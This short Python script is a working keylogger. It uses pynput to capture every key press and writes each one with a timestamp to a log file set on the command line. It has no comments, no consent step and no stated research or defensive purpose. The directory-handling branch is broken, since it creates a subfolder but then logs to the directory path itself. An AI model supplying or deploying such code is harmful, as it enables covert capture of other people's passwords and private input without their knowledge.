from pynput.keyboard import Listener
import logging
import argparse
import sys
import os


def input_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--file-path", action="store", dest="file_path", help="enter the path including the log file name")
    return parser


def on_press(key):
    logging.info(str(key))


def main(argv):
    parser = input_parse()
    args = parser.parse_args(argv)
    file_path = "0"
    if args.file_path:
        file_path = args.file_path
    if os.path.isdir(file_path):
        os.makedirs(os.path.join(file_path, '0'))
    logging.basicConfig(filename=file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main(sys.argv[1:])
